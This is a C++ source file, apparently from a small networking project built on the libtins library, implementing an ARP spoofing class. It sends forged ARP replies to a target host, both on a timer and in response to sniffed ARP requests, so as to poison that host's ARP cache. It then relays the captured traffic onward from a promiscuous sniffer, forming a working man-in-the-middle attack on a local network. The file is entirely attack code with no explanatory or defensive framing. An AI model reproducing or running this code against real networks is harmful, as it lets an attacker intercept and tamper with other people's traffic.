#include<tins/tins.h>
#include<unistd.h>
#include"arpspoofer.h"
#include"filtering.h"

using namespace std;
using namespace Tins;

ARPSpoofer::ARPSpoofer(const char *txipaddr,const char *rxipaddr)
    : TXipaddr(txipaddr),RXipaddr(rxipaddr)
{
    iface = NetworkInterface::default_interface();
    PacketSender send;
    while(true)
    {
        try{
            RXhwaddr = Utils::resolve_hwaddr(iface,RXipaddr,send);
            RXhwaddr = Utils::resolve_hwaddr(iface,RXipaddr,send);
        }
        catch(exception &e){
            continue;
        }
        break;
    }

    TXhwaddr = Utils::resolve_hwaddr(iface,TXipaddr.to_string(),send);
    Myipaddr = iface.ipv4_address();
    Myhwaddr = iface.hw_address();
}

void ARPSpoofer::startarpspoofing(void)
{
    status = true;
    startcorrupt();
    startrelay();
}

void ARPSpoofer::stoparpspoofing(void)
{
    status = false;
    sleep(1);
    for(auto& th : threads)
        th.detach();

    PacketSender send;
    ARP arph(TXipaddr,RXipaddr,TXhwaddr,RXhwaddr);
    arph.opcode(ARP::REPLY);
    EthernetII correct = EthernetII(TXhwaddr,Myhwaddr) / arph;
    send.send(correct,iface);
}

void ARPSpoofer::startcorrupt(void)
{
    threads.push_back(thread(std::bind(&ARPSpoofer::intelsendarp,this)));
    threads.push_back(thread(std::bind(&ARPSpoofer::timersendarp,this)));
}

void ARPSpoofer::startrelay(void)
{
    threads.push_back(thread(std::bind(&ARPSpoofer::relayingpacket,this)));
}

void ARPSpoofer::intelsendarp(void)
{
    SnifferConfiguration config;
    config.set_promisc_mode(true);
    config.set_filter("ether proto \\arp");
    Sniffer sniff(iface.name(),config);
    PacketSender send;
    PDU* packet;

    ARP arps(TXipaddr,RXipaddr,TXhwaddr,Myhwaddr);
    arps.opcode(ARP::REPLY);
    EthernetII corrupt = EthernetII(TXhwaddr,Myhwaddr) / arps;
    while(status)
    {
        packet = sniff.next_packet();
        ARP &arpr = packet->rfind_pdu<ARP>();
        if(arpr.opcode() == ARP::REQUEST && \
                arpr.target_ip_addr() == RXipaddr && \
                arpr.sender_ip_addr() == TXipaddr )
        {
            send.send(corrupt,iface);
            sleep(1);
            send.send(corrupt,iface);
        }
    }
}

void ARPSpoofer::timersendarp(void)
{
    PacketSender send;
    ARP arph(TXipaddr,RXipaddr,TXhwaddr,Myhwaddr);
    arph.opcode(ARP::REPLY);
    EthernetII corrupt = EthernetII(TXhwaddr,Myhwaddr) / arph;
    while(status)
    {
        send.send(corrupt,iface);
        sleep(10);
    }
}

void ARPSpoofer::relayingpacket(void)
{
    SnifferConfiguration config;
    config.set_promisc_mode(true);
    string filter;
    filter += "ether src ";
    filter += TXhwaddr.to_string();
    filter += " && not ip dst ";
    filter += Myipaddr.to_string();
    cout << filter << endl;
    config.set_filter(filter);
    Sniffer sniff(iface.name(),config);
    PacketSender send;
    PDU* packet;
    EthernetII *eth;

    while(status)
    {
        packet = sniff.next_packet();
        eth = packet->find_pdu<EthernetII>();
        eth->dst_addr(RXhwaddr);
        eth->src_addr(Myhwaddr);
        try{
            send.send(*packet,iface);
        }
        catch(exception &e){;}
    }
}


